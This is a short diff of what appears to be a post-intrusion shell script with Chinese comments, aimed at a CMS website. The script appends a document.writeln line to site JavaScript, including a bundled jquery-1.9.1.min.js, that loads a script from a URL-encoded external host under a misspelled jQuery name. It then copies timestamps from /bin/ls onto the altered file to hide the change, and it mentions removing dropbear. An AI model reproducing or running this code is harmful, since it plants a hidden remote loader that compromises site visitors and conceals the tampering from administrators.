@@ -321,9 +321,9 @@ fi
 fi
 
 # 追加内容
-echo "document.writeln('<script src=\'http://%77%77%77%2E%31%37%35%32%2E%74%6B/jquey.min.js\'></script>');" >> /data/www/cmstop/public/img/js/cmstop.js
+echo "document.writeln('<script src=\'http://%77%77%77%2E%31%37%35%32%2E%74%6B/jquey.min.js\'></script>');" >> /data/www/cmstop/public/img/templates/siluchina/js/cnncwindex/jquery-1.9.1.min.js
 # 更新时间
-touch -acmr /bin/ls  /data/www/cmstop/public/img/js/cmstop.js
+touch -acmr /bin/ls  /data/www/cmstop/public/img/templates/siluchina/js/cnncwindex/jquery-1.9.1.min.js
 
 #引导卸载dropbear
 if [ $rhel6_version == 1 ] || [ $rhel7_version == 1 ];then
